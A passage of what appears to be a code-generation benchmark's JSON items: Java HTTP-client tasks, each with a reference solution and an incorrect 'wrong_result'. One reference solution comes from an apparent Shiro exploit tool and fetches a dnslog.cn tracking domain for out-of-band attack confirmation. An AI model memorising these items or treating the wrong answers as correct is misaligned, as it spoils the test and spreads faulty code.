5000);\n            conn.setRequestMethod(\"HEAD\");\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_PARTIAL) {\n                sourceInfo = new SourceInfo(url, getContentLength(conn), conn.getContentType());\n                if (sourceInfoStorage != null) {\n                    sourceInfoStorage.storeSourceInfo(sourceInfo);\n                }\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to fetch content info\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Java class that implements a REST client using HttpURLConnection for making HTTP requests with support for authentication, headers, and parameters.\n\nClass Description: The RestClient class provides functionality to send HTTP requests to a specified server with configurable protocol, host, port, and authentication. It supports various HTTP methods, request parameters, headers, and handles response processing.\n\nAttributes:\n- protocol: [Protocol] - The protocol to use (HTTP/HTTPS)\n- host: [String] - The hostname or IP address of the server\n- port: [int] - The port number of the server\n- username: [String] - The username for basic authentication (nullable)\n- password: [String] - The password for basic authentication (nullable)\n\nMethods:\n- getUrl: [String path, Param... param] -> [URL] - Constructs a complete URL from path and parameters\n- send: [Method method, String path, Option[] options, StreamConsumer outStreamConsumer] -> [CompletableFuture<Response>] - Sends an HTTP request asynchronously and returns a future containing the response\n- tryGetResponseTextFrom: [HttpURLConnection conn, int status] -> [String] - Reads the response text from the connection\n- getResponseCodeFrom: [HttpURLConnection conn] -> [int] - Gets the response code from the connection, handling 404 specifically\n\nHelper Interfaces/Classes:\n- StreamConsumer: Functional interface for writing to output streams\n- SingletonIterator: Utility iterator for single-element collections\n- Response: Contains status code, response text, and headers (implied but not shown in code)\n- RestException: Custom exception for REST-related errors (implied but not shown in code)",
    "Canonical_solution": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.Iterator;\nimport java.util.NoSuchElementException;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.function.Consumer;\nimport java.util.stream.Stream;\n\nfinal class RestClient {\n\n    private static final int BUFFER_SIZE = 1024;\n    private static final Iterator<String> NO_ITERATOR = new Iterator<String>() {\n        @Override\n        public boolean hasNext() { return false; }\n\n        @Override\n        public String next() {\n            throw new NoSuchElementException(\"This method should never be called.\");\n        }\n    };\n\n    private final Protocol protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    RestClient(Protocol protocol, String host, int port, String username, String password) {\n        this.protocol = Objects.requireNonNull(protocol);\n        this.host     = Objects.requireNonNull(host);\n        this.port     = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    protected URL getUrl(String path, Param... param) {\n        final StringBuilder url = new StringBuilder()\n            .append(getProtocol())\n            .append(\"://\")\n            .append(host);\n\n        if (port > 0) {\n            url.append(\":\").append(port);\n        }\n\n        url.append(\"/\").append(path);\n\n        if (param.length > 0) {\n            url.append(\n                Stream.of(param)\n                    .map(p -> encode(p.getKey()) + \"=\" + encode(p.getValue()))\n                    .collect(joining(\"&\", \"?\", \"\"))\n            );\n        }\n\n        try {\n            return new URL(url.toString());\n        } catch (Exception ex) {\n            throw new IllegalArgumentException(\"Error building URL\", ex);\n        }\n    }\n\n    private CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        return CompletableFuture.supplyAsync(() -> {\n            HttpURLConnection conn = null;\n            try {\n                final Param[] params = Stream.of(options)\n                    .filter(o -> o.getType() == PARAM)\n                    .map(Param.class::cast)\n                    .toArray(Param[]::new);\n                \n                final Header[] headers = Stream.of(options)\n                    .filter(o -> o.getType() == HEADER)\n                    .map(Header.class::cast)\n                    .toArray(Header[]::new);\n                \n                conn = (HttpURLConnection) getUrl(path, params).openConnection();\n                conn.setRequestMethod(method.name());\n                conn.setUseCaches(false);\n                conn.setAllowUserInteraction(false);\n\n                if (username != null && password != null) {\n                    final String encoding = Base64.getEncoder()\n                        .encodeToString((username + \":\" + password).getBytes());\n                    conn.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n                }\n\n                for (final Header header : headers) {\n                    conn.setRequestProperty(header.getKey(), header.getValue());\n                }\n\n                final boolean doOutput = outStreamConsumer != IGNORE;\n                conn.setDoOutput(doOutput);\n                conn.connect();\n\n                if (doOutput) {\n                    try (OutputStream out = conn.getOutputStream()) {\n                        outStreamConsumer.writeTo(out);\n                        out.flush();\n                    }\n                }\n\n                int status = getResponseCodeFrom(conn);\n                String text = tryGetResponseTextFrom(conn, status);\n                return new Response(status, text, conn.getHeaderFields());\n            } catch (Exception ex) {\n                throw new RestException(ex, protocol, method, username, host, port, path, options);\n            } finally {\n                if (conn != null) conn.disconnect();\n            }\n        });\n    }\n\n    private static String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        try (BufferedReader rd = new BufferedReader(\n            new InputStreamReader(status >= 400 \n                ? conn.getErrorStream() \n                : conn.getInputStream()))) {\n            \n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    private static int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        try {\n            return conn.getResponseCode();\n        } catch (FileNotFoundException ex) {\n            return 404;\n        }\n    }\n\n    @FunctionalInterface\n    private interface StreamConsumer {\n        void writeTo(OutputStream out) throws IOException;\n    }\n\n    private static final class SingletonIterator<E> implements Iterator<E> {\n        private final E e;\n        private boolean hasNext = true;\n\n        private SingletonIterator(E e) { this.e = e; }\n\n        public boolean hasNext() { return hasNext; }\n\n        public E next() {\n            if (hasNext) {\n                hasNext = false;\n                return e;\n            }\n            throw new NoSuchElementException();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public interface StreamConsumer {\n    void accept(OutputStream out);\n}\n\npublic class SingletonIterator implements Iterator<String> {\n    private final String element;\n    private boolean hasNext = true;\n\n    public SingletonIterator(String element) {\n        this.element = element;\n    }\n\n    @Override\n    public boolean hasNext() {\n        return hasNext;\n    }\n\n    @Override\n    public String next() {\n        if (!hasNext) {\n            throw new NoSuchElementException();\n        }\n        hasNext = false;\n        return element;\n    }\n}\n\npublic class Response {\n    private final int statusCode;\n    private final String responseText;\n    private final Map<String, List<String>> headers;\n\n    public Response(int statusCode, String responseText, Map<String, List<String>> headers) {\n        this.statusCode = statusCode;\n        this.responseText = responseText;\n        this.headers = headers;\n    }\n\n    public int getStatusCode() {\n        return statusCode;\n    }\n\n    public String getResponseText() {\n        return responseText;\n    }\n\n    public Map<String, List<String>> getHeaders() {\n        return headers;\n    }\n}\n\npublic class RestException extends Exception {\n    public RestException(String message) {\n        super(message);\n    }\n}\n\npublic enum Method {\n    GET, POST, PUT, DELETE, PATCH\n}\n\npublic class Param {\n    private final String name;\n    private final String value;\n\n    public Param(String name, String value) {\n        this.name = name;\n        this.value = value;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n\npublic interface Option {\n    String getKey();\n    String getValue();\n}\n\npublic class RestClient {\n    private final String protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    public RestClient(String protocol, String host, int port, String username, String password) {\n        this.protocol = protocol;\n        this.host = host;\n        this.port = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    public String getUrl(String path, Param... params) {\n        StringBuilder urlBuilder = new StringBuilder();\n        urlBuilder.append(protocol).append(\"://\").append(host);\n        if (port != 80 && port != 443) {\n            urlBuilder.append(\":\").append(port);\n        }\n        urlBuilder.append(path);\n\n        if (params.length > 0) {\n            urlBuilder.append(\"?\");\n            for (int i = 0; i < params.length; i++) {\n                Param param = params[i];\n                urlBuilder.append(param.getName()).append(\"=\").append(param.getValue());\n                if (i < params.length - 1) {\n                    urlBuilder.append(\"&\");\n                }\n            }\n        }\n\n        return urlBuilder.toString();\n    }\n\n    public CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        String fullUrl = getUrl(path, extractParamsFromOptions(options));\n        try {\n            URL url = new URL(fullUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(method.name());\n            conn.setInstanceFollowRedirects(false);\n\n            for (Option option : options) {\n                if (option.getKey().equals(\"header\")) {\n                    conn.setRequestProperty(option.getKey(), option.getValue());\n                }\n            }\n\n            if (username != null && password != null) {\n                String auth = username + \":\" + password;\n                String encodedAuth = Base64.getEncoder().encodeToString(auth.getBytes(StandardCharsets.UTF_8));\n                conn.setRequestProperty(\"Authorization\", \"Basic \" + encodedAuth);\n            }\n\n            if (method == Method.POST || method == Method.PUT) {\n                conn.setDoOutput(true);\n            }\n\n            if (outStreamConsumer != null) {\n                try (OutputStream out = conn.getOutputStream()) {\n                    outStreamConsumer.accept(out);\n                } catch (IOException e) {\n                    throw new RestException(\"Error writing request body: \" + e.getMessage());\n                }\n            }\n\n            int responseCode = getResponseCodeFrom(conn);\n            String responseText = tryGetResponseTextFrom(conn, responseCode);\n            Map<String, List<String>> headers = getHeaders(conn);\n\n            return CompletableFuture.supplyAsync(() -> new Response(responseCode, responseText, headers));\n        } catch (IOException e) {\n            throw new RestException(\"Error sending request: \" + e.getMessage());\n        }\n    }\n\n    private int getResponseCodeFrom(HttpURLConnection conn) {\n        try {\n            return conn.getResponseCode();\n        } catch (IOException e) {\n            throw new RestException(\"Error getting response code: \" + e.getMessage());\n        }\n    }\n\n    private String tryGetResponseTextFrom(HttpURLConnection conn, int status) {\n        if (status == 404) {\n            return \"Not Found\";\n        }\n        try (InputStream is = conn.getInputStream()) {\n            StringBuilder sb = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        } catch (IOException e) {\n            try (InputStream is = conn.getErrorStream()) {\n                StringBuilder sb = new StringBuilder();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line);\n                }\n                return sb.toString();\n            } catch (IOException ex) {\n                return \"Error reading response: \" + ex.getMessage();\n            }\n        }\n    }\n\n    private Map<String, List<String>> getHeaders(HttpURLConnection conn) {\n        Map<String, List<String>> headers = new HashMap<>();\n        for (Map.Entry<String, List<String>> entry : conn.getHeaderFields().entrySet()) {\n            String key = entry.getKey();\n            if (key != null) {\n                headers.put(key, entry.getValue());\n            }\n        }\n        return headers;\n    }\n\n    private Param[] extractParamsFromOptions(Option[] options) {\n        List<Param> params = new ArrayList<>();\n        for (Option option : options) {\n            if (option.getKey().equals(\"param\")) {\n                params.add(new Param(option.getValue(), option.getValue()));\n            }\n        }\n        return params.toArray(new Param[0]);\n    }\n}"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Java class that interacts with a DNS log service to retrieve a domain and session information for tracking DNS requests.\n\nClass Description: The GetDNSLogRecordTask class is responsible for making an HTTP GET request to a DNS log service (dnslog.cn) to obtain a temporary domain and session cookie. It stores the retrieved information in a configuration object and tracks the operation's status.\n\nAttributes:\n- status: int - Tracks the execution status of the task (1 for success, -1 for failure)\n- config: Config - Configuration object where DNS log information will be stored\n\nMethods:\n- GetDNSLogRecordTask(Config config) -> None - Constructor that initializes the class with a configuration object\n- getStatus() -> int - Returns the current status of the task\n- execute() -> Integer - Performs the HTTP request to get DNS log information and returns 1 regardless of success/failure (legacy behavior)",
    "Canonical_solution": "import com.shiroexploit.util.Config;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class GetDNSLogRecordTask {\n\n    private int status = 0;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config){\n        this.config = config;\n    }\n\n    public int getStatus(){\n        return status;\n    }\n\n    public Integer execute() {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        BufferedReader reader = null;\n        StringBuffer sb = new StringBuffer();\n\n        try {\n            connection = (HttpURLConnection)new URL(\"http://www.dnslog.cn/getdomain.php\").openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                String sessinoId = connection.getHeaderField(\"Set-Cookie\");\n                sessinoId = sessinoId.split(\";\")[0];\n\n                inputStream = connection.getInputStream();\n                reader = new BufferedReader(new InputStreamReader(inputStream));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line);\n                }\n\n                Config.getInstance().setSessionId(sessinoId);\n                Config.getInstance().setDnsLogRecord(sb.toString());\n                status = 1;\n                return 1;\n            }\n        }\n        catch (IOException e) {\n            status = -1;\n            return 1;\n        } finally {\n            try {\n                if (connection != null) connection.disconnect();\n                if (inputStream != null) inputStream.close();\n                if (reader != null) reader.close();\n            } catch (IOException e) {\n                status = -1;\n                return 1;\n            }\n        }\n\n        status = -1;\n        return 1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport org.json.JSONObject;\n\npublic class GetDNSLogRecordTask {\n    private int status;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config) {\n        this.config = config;\n    }\n\n    public int getStatus() {\n        return status;\n    }\n\n    public Integer execute() {\n        try {\n            URL url = new URL(\"http://dnslog.cn/getdnslog\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String line;\n                StringBuilder response = new StringBuilder();\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                JSONObject json = new JSONObject(response.toString());\n                String domain = json.getString(\"domain\");\n                String session = json.getString(\"session\");\n                config.setDomain(domain);\n                config.setSessionCookie(session);\n                status = 1;\n            } else {\n                status = -1;\n            }\n        } catch (Exception e) {\n            status = -1;\n        }\n        return 1;\n    }\n}"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously in an Android environment, using HttpURLConnection for network operations and AsyncTask for background processing.\n\nClass Description: HttpRequestHandler is a utility class designed to perform HTTP GET requests asynchronously. It contains an inner AsyncTask class for background network operations and a helper method for converting InputStream to String.\n\nAttributes: (None - this is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - An AsyncTask subclass that performs HTTP GET requests in the background. Takes a URL string as input and processes the response.\n  - onPreExecute(): void - Empty preparation method (can be overridden)\n  - doInBackground(String...): String - Performs the network request, reads response, and publishes progress\n  - onProgressUpdate(String...): void - Shows the response in a Toast message\n  - onPostExecute(String): void - Empty completion method (can be overridden)\n\nMethod2: ConvertInputToStringNoChange(InputStream) -> String - Helper method that converts an InputStream to a String by reading all lines.\n  - Input: InputStream - The input stream to convert\n  - Output: String - The concatenated string from the input stream",
    "Canonical_solution": "import android.content.Intent;\nimport android.os.AsyncTask;\nimport android.widget.Toast;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n            //before works\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                Toast.makeText(getApplicationContext(), progress[0], Toast.LENGTH_LONG).show();\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {}\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public MyAsyncTask getNews(String... params) {\n        return new MyAsyncTask();\n    }\n\n    private class MyAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL obj = new URL(url);\n                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.connect();\n                InputStream responseStream = conn.getInputStream();\n                String response = ConvertInputToStringNoChange(responseStream);\n                publishProgress(response);\n                return response;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            String response = values[0];\n            Toast.makeText(HttpRequestHandler.this.getContext(), response, Toast.LENGTH_LONG).show();\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n        }\n    }\n\n    private String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder stringBuilder = new StringBuilder();\n        String line;\n        try {\n            while ((line = bufferedReader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return stringBuilder.toString();\n    }\n}"
  },
  {
    "Task_id": 83,
    "Instruction": "Task Description: Create a utility class in Java that handles HTTP requests using HttpURLConnection, with support for custom headers and timeouts.\n\nClass Description: HttpHelper is a final utility class that provides static methods for making HTTP requests. It encapsulates the complexity of HttpURLConnection and provides error handling. The class cannot be instantiated.\n\nAttributes: None (This is a utility class with only static methods)\n\nMethods:\nMethod1: getHttpContents(String method, String endpoint, Map<String, String> headers) -> String - Makes an HTTP request to the specified endpoint using the given method and headers. Returns the response content as a String.\n  - Parameters:\n    - method: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n    - endpoint: String - The URL to send the request to\n    - headers: Map<String, String> - Optional map of request headers (can be null)\n  - Returns: String - The response content from the server\n  - Throws: MongoClientException if an IOException occurs during the request",
    "Canonical_solution": "import com.mongodb.MongoClientException;\nimport com.mongodb.lang.NonNull;\nimport com.mongodb.lang.Nullable;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\nfinal class HttpHelper {\n\n    private HttpHelper() {\n    }\n\n    @NonNull\n    public static String getHttpContents(final String method, final String endpoint, @Nullable final Map<String, String> headers) {\n        StringBuilder content = new StringBuilder();\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(endpoint).openConnection();\n            conn.setConnectTimeout(10000);\n            conn.setReadTimeout(10000);\n            conn.setRequestMethod(method);\n            if (headers != null) {\n                for (Map.Entry<String, String> kvp : headers.entrySet()) {\n                    conn.setRequestProperty(kvp.getKey(), kvp.getValue());\n                }\n            }\n\n            int status = conn.getResponseCode();\n            if (status != HttpURLConnection.HTTP_OK) {\n                throw new IOException(String.format(\"%d %s\", status, conn.getResponseMessage()));\n            }\n\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    content.append(inputLine);\n                }\n            }\n        } catch (IOException e) {\n            throw new MongoClientException(\"Unexpected IOException from endpoint \" + endpoint + \".\", e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        return content.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public final class HttpHelper {\n    private HttpHelper() {\n    }\n\n    public static String getHttpContents(String method, String endpoint, Map<String, String> headers) throws MongoClientException {\n        try {\n            URL url = new URL(endpoint);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(method);\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(5000);\n\n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    conn.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            int responseCode = conn.getResponseCode();\n            StringBuilder response = new StringBuilder();\n            if (responseCode >= 200 && responseCode < 300) {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                }\n            } else {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                }\n            }\n\n            return response.toString();\n        } catch (MalformedURLException e) {\n            throw new MongoClientException(\"Invalid endpoint: \" + endpoint, e);\n        } catch (IOException | IllegalArgumentException e) {\n            throw new MongoClientException(\"HTTP request failed\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 84,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling authentication, and processing JSON responses.\n\nClass Description: JobRemotingUtil is a utility class that provides functionality for making remote HTTP POST requests with JSON data. It handles connection setup, request configuration, payload serialization, response processing, and error handling. The class includes logging capabilities and supports access token authentication.\n\nAttributes:\nlogger: [Logger] - SLF4J logger instance for logging errors and debug information\nXXL_RPC_ACCESS_TOKEN: [String] - Constant string for the authentication token header name\n\nMethods:\npostBody: [Name](String url, String accessToken, Object requestObj, int timeout) -> ReturnT<String> - Makes an HTTP POST request to the specified URL with the given request object serialized as JSON. Handles authentication via access token, sets appropriate headers, and processes the JSON response. Returns a ReturnT<String> object containing the response status, message, and content. The timeout parameter specifies the read timeout in seconds.",
    "Canonical_solution": "import com.wugui.datatx.core.biz.model.ReturnT;\nimport com.wugui.datax.rpc.util.json.BasicJson;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class JobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_RPC_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            String requestBody = BasicJson.toJson(requestObj);\n            DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n            dataOutputStream.writeBytes(requestBody);\n            dataOutputStream.flush();\n            dataOutputStream.close();\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                Map<String, Object> resultMap = BasicJson.parseMap(resultJson);\n\n                ReturnT<String> returnT = new ReturnT<String>();\n                if (resultMap==null) {\n                    returnT.setCode(ReturnT.FAIL_CODE);\n                    returnT.setMsg(\"AdminBizClient Remoting call fail.\");\n                } else {\n                    returnT.setCode(Integer.valueOf(String.valueOf(resultMap.get(\"code\"))));\n                    returnT.setMsg(String.valueOf(resultMap.get(\"msg\")));\n                    returnT.setContent(String.valueOf(resultMap.get(\"content\")));\n                }\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import org.apache.http.client.methods.HttpPost;\nimport org.apache.http.entity.StringEntity;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.client.config.RequestConfig;\nimport org.apache.http.util.EntityUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.core.JsonProcessingException;\n\npublic class JobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static final String XXL_RPC_ACCESS_TOKEN = \"X-XL-RPC-ACCESS-TOKEN\";\n\n    public static class ReturnT<T> {\n        private int code;\n        private String msg;\n        private T content;\n\n        public ReturnT(int code, String msg, T content) {\n            this.code = code;\n            this.msg = msg;\n            this.content = content;\n        }\n\n        public int getCode() { return code; }\n        public String getMsg() { return msg; }\n        public T getContent() { return content; }\n    }\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        try (CloseableHttpClient httpClient = HttpClients.custom()\n                .setDefaultRequestConfig(RequestConfig.custom()\n                        .setConnectTimeout(timeout * 1000)\n                        .setSocketTimeout(timeout * 1000)\n                        .build())\n                .build()) {\n\n            HttpPost httpPost = new HttpPost(url);\n            httpPost.setHeader(\"Content-Type\", \"application/json\");\n            httpPost.setHeader(XXL_RPC_ACCESS_TOKEN, accessToken);\n\n            ObjectMapper mapper = new ObjectMapper();\n            String jsonRequest = mapper.writeValueAsString(requestObj);\n            httpPost.setEntity(new StringEntity(jsonRequest));\n\n            HttpResponse response = httpClient.execute(httpPost);\n            int statusCode = response.getStatusLine().getStatusCode();\n\n            String responseBody;\n            if (response.getEntity() != null) {\n                responseBody = EntityUtils.toString(response.getEntity());\n            } else {\n                responseBody = \"\";\n            }\n\n            if (statusCode == 200) {\n                return new ReturnT<>(200, \"Success\", responseBody);\n            } else {\n                return new ReturnT<>(statusCode, \"HTTP Error \" + statusCode, responseBody);\n            }\n        } catch (JsonProcessingException e) {\n            logger.error(\"JSON serialization error\", e);\n            return new ReturnT<>(500, \"JSON Error\", null);\n        } catch (Exception e) {\n            logger.error(\"Error making POST request\", e);\n            return new ReturnT<>(500, \"Internal Server Error\", null);\n        }\n    }\n}"
  },
  {
    "Task_id": 85,
    "Instruction": "Task Description: Create a function that sends an HTTP POST request to a specified URL with a given parameter and returns the response as a string.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends a POST request with the specified parameter, reads the response from the server, and returns it as a string. It handles the connection setup, request configuration, data transmission, and response processing.\n\nInput:\n- url (String): The target URL to which the HTTP POST request will be sent.\n- name (String): The parameter value to be sent in the request body (as \"name=[value]\").\n\nOutput:\n- String: The response received from the server as a string. If an error occurs, the function will return an empty string after printing the stack trace.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate String sendHttpRequest(String url, String name) {\n    StringBuffer buffer = new StringBuffer();\n    try {\n        HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.connect();\n        con.getOutputStream().write( (\"name=\" + name).getBytes());\n        \n        InputStream is = con.getInputStream();\n        byte[] b = new byte[1024];\n        \n        while ( is.read(b) != -1)\n            buffer.append(new String(b));\n        \n        con.disconnect();\n    }\n    catch(Throwable t) {\n        t.printStackTrace();\n    }\n    \n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
